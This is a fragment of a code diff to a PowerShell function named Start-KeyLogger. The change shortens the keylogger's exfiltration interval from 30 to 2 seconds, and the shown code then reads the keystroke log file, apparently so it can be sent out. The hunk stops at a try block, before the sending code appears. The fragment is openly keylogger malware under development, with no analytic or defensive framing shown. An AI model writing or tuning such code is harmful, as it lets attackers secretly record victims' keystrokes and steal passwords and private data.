@@ -30,7 +30,7 @@ function Start-KeyLogger {
       }
     }
     # Exfiltrate every 30 seconds
-    if ((Get-Date) - $lastCheck -gt [TimeSpan]::FromSeconds(30)) {
+    if ((Get-Date) - $lastCheck -gt [TimeSpan]::FromSeconds(2)) {
       if (Test-Path $logFile) {
         $logData = Get-Content -Path $logFile -Raw
         try {
